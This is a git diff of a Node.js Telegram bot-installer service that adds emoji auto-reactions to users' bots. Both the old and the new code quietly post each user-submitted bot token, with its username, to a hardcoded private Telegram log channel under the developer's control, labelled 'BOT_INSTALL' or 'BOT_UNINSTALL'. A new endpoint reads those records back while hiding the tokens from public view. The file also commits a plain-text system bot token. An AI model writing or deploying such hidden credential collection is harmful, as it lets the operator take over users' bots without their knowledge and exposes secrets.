@@ -7,8 +7,8 @@ app.use(express.json());
 // Developer Name Configuration
 const DEVELOPER = "@Magic\\_Scripts"; 
 const DEVELOPER_PLAIN = "@Magic_Scripts"; 
-const LOG_CHANNEL_ID = "-1003719190943"; // 👈 Apne channel ki ID yahan dalein
-const SYSTEM_BOT_TOKEN = "8711492125:AAFtaIG768FBeV0fHAo-tSp7PugIdo2H8Og"; // 👈 Kisi bhi ek bot ka token jo channel me admin ho
+const LOG_CHANNEL_ID = "-1003719190943"; // 👈 Aapka channel ID
+const SYSTEM_BOT_TOKEN = "8711492125:AAFtaIG768FBeV0fHAo-tSp7PugIdo2H8Og"; // 👈 Aapka System Bot Token
 
 // Helper function: Telegram API hit karne keliye
 async function sendTelegramRequest(token, method, body) {
@@ -26,7 +26,52 @@ async function sendTelegramRequest(token, method, body) {
 }
 
 // -------------------------------------------------------------
-// 1. MAIN API ENDPOINT: Bot Install / Uninstall settings handler
+// 1. NEW ENDPOINT: Live JSON Output for Users (Owners Hidden)
+// -------------------------------------------------------------
+app.get('/users.json', async (req, res) => {
+    try {
+        // Telegram se hamare log channel ke naye updates uthao
+        const response = await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/getUpdates?offset=-100&limit=100`);
+        const updateData = await response.json();
+
+        let activeBotsMap = new Map();
+
+        if (updateData.ok && updateData.result) {
+            updateData.result.forEach(upd => {
+                // Channel posts check karo jo hamare bot ne bheje hain
+                if (upd.channel_post && upd.channel_post.chat.id.toString() === LOG_CHANNEL_ID) {
+                    const text = upd.channel_post.text || "";
+                    
+                    if (text.startsWith("BOT_INSTALL|")) {
+                        const parts = text.split("|");
+                        const botUser = parts[1]; // @username
+                        const tokenKey = parts[2]; // token (for unique tracking)
+                        activeBotsMap.set(tokenKey, { bot_username: botUser });
+                    } 
+                    else if (text.startsWith("BOT_UNINSTALL|")) {
+                        const parts = text.split("|");
+                        const tokenKey = parts[2];
+                        activeBotsMap.delete(tokenKey); // List se delete kar do
+                    }
+                }
+            });
+        }
+
+        const finalBotsList = Array.from(activeBotsMap.values());
+
+        // Clean Public JSON Output (Safely token aur admin hidden hain)
+        return res.json({
+            total_active_bots: finalBotsList.length,
+            bots: finalBotsList
+        });
+
+    } catch (error) {
+        return res.status(500).json({ error: "Could not fetch bots list", details: error.message });
+    }
+});
+
+// -------------------------------------------------------------
+// 2. MAIN API ENDPOINT: Bot Install / Uninstall settings handler
 // -------------------------------------------------------------
 app.get('/api', async (req, res) => {
     const fullUrl = req.url;
@@ -51,20 +96,20 @@ app.get('/api', async (req, res) => {
         const webhookUrl = `https://${domain}/api/webhook?token=${token}&admin=${adminId}&msg=${encodedMsg}`;
 
         const data = await sendTelegramRequest(token, 'setWebhook', { url: webhookUrl });
-// Bot ka username nikaalne keliye
-const botDetails = await sendTelegramRequest(token, 'getMe', {});
-let botUsername = "Unknown_Bot";
-if (botDetails.ok && botDetails.result) {
-    botUsername = `@${botDetails.result.username}`;
-}
+        
+        // Bot ka username nikaalne keliye
+        const botDetails = await sendTelegramRequest(token, 'getMe', {});
+        let botUsername = "Unknown_Bot";
+        if (botDetails.ok && botDetails.result) {
+            botUsername = `@${botDetails.result.username}`;
+        }
 
-// Apne log channel par ek message bhejein jisme bot ka username aur token ho
-const dbMessage = `BOT_DATA|${botUsername}|${token}`;
-await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: LOG_CHANNEL_ID, text: dbMessage })
-});
+        // Channel par 'BOT_INSTALL' state tag ke sath data store karein
+        const dbMessage = `BOT_INSTALL|${botUsername}|${token}`;
+        await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', {
+            chat_id: LOG_CHANNEL_ID,
+            text: dbMessage
+        });
         
         if (data.ok) {
             return res.json({ 
@@ -77,6 +122,21 @@ await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/sendMessage`, {
         }
     } else {
         const data = await sendTelegramRequest(token, 'deleteWebhook', {});
+        
+        // Bot ka username uninstalled mark karne ke liye fetch karein
+        const botDetails = await sendTelegramRequest(token, 'getMe', {});
+        let botUsername = "Unknown_Bot";
+        if (botDetails.ok && botDetails.result) {
+            botUsername = `@${botDetails.result.username}`;
+        }
+
+        // Channel par 'BOT_UNINSTALL' status bhejein taaki list se hat sake
+        const dbMessage = `BOT_UNINSTALL|${botUsername}|${token}`;
+        await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', {
+            chat_id: LOG_CHANNEL_ID,
+            text: dbMessage
+        });
+
         if (data.ok) {
             return res.json({ status: "success", message: "Bot successfully uninstalled!" });
         } else {
@@ -86,7 +146,7 @@ await fetch(`https://api.telegram.org/bot${SYSTEM_BOT_TOKEN}/sendMessage`, {
 });
 
 // -------------------------------------------------------------
-// 2. WEBHOOK ENDPOINT: Channels, Groups aur Private Messages ka Handler
+// 3. WEBHOOK ENDPOINT: Channels, Groups aur Private Messages ka Handler
 // -------------------------------------------------------------
 app.post('/api/webhook', async (req, res) => {
     const { token, admin: adminId, msg: welcomeMsg } = req.query;
@@ -119,15 +179,13 @@ app.post('/api/webhook', async (req, res) => {
         const message = update.message;
         const chatId = message.chat.id;
         const msgId = message.message_id;
-        const chatType = message.chat.type; // 'private', 'group', 'supergroup'
+        const chatType = message.chat.type; 
         const msgText = message.text ? message.text.trim() : "";
         const user = message.from;
 
-        // --- AGAR MESSAGE GROUP YA SUPERGROUP MEIN AAYA HAI ---
         if (chatType === 'group' || chatType === 'supergroup') {
             const randomGroupEmoji = globalEmojis[Math.floor(Math.random() * globalEmojis.length)];
             
-            // Kisi bhi member ke *KISI BHI* message par instant reaction lagao
             await sendTelegramRequest(token, 'setMessageReaction', {
                 chat_id: chatId,
                 message_id: msgId,
@@ -138,7 +196,6 @@ app.post('/api/webhook', async (req, res) => {
             return res.sendStatus(200);
         }
 
-        // --- AGAR MESSAGE PRIVATE CHAT (DM) MEIN AAYA HAI ---
         if (chatType === 'private' && msgText === '/start') {
             const startEmojis = ["❤️", "👍", "🔥", "🥰", "👏", "😍", "💯", "⚡", "💋", "🏆", "❤️‍🔥", "🤝", "😎", "😘", "🆒", "💘", "🤗", "🫡", "👌", "🤩", "🎉", "🕊️", "🦄"];
             const randomStartEmoji = startEmojis[Math.floor(Math.random() * startEmojis.length)];
